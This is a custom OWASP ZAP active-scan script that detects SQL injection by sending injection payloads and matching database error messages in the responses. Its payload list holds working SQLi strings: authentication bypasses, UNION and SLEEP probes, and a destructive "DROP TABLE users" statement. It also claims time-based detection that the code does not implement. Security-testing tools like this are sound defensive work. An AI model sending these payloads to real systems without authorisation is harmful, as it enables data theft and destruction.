// ZAP Active Scanner - Custom SQLi Detection
// Type: active
// Engine: ECMAScript (Graal.js)
// Description: Enhanced SQL injection detection with time-based and error-based payloads

var ScanRuleMetadata = Java.type('org.zaproxy.addon.commonlib.scanrules.ScanRuleMetadata');

function getMetadata() {
    return ScanRuleMetadata.fromYaml("active_sqli_custom.yaml");
}

function scan(as, msg, param, value) {
    // SQL injection payloads
    var payloads = [
        "' OR '1'='1",
        "' OR '1'='1'--",
        "'; DROP TABLE users--",
        "1; SELECT SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "1 AND 1=1",
        "1' AND '1'='1",
        "' UNION SELECT NULL--",
        "admin'--",
        "1' ORDER BY 1--"
    ];
    
    // Error patterns indicating SQL injection
    var errorPatterns = [
        "SQL syntax",
        "mysql_fetch",
        "ORA-",
        "PostgreSQL",
        "SQLite",
        "ODBC",
        "Microsoft SQL",
        "syntax error",
        "unclosed quotation"
    ];
    
    for (var i = 0; i < payloads.length; i++) {
        var payload = payloads[i];
        
        // Create attack message
        var attackMsg = msg.cloneRequest();
        as.setParameter(attackMsg, param, payload);
        as.sendAndReceive(attackMsg, false);
        
        var responseBody = attackMsg.getResponseBody().toString();
        
        // Check for error-based SQLi
        for (var j = 0; j < errorPatterns.length; j++) {
            if (responseBody.indexOf(errorPatterns[j]) >= 0) {
                as.newAlert()
                    .setRisk(3) // High
                    .setConfidence(2) // Medium
                    .setName("SQL Injection (Custom)")
                    .setParam(param)
                    .setAttack(payload)
                    .setEvidence(errorPatterns[j])
                    .setDescription("SQL injection vulnerability detected using custom scanner")
                    .setMessage(attackMsg)
                    .raise();
                return;
            }
        }
    }
}
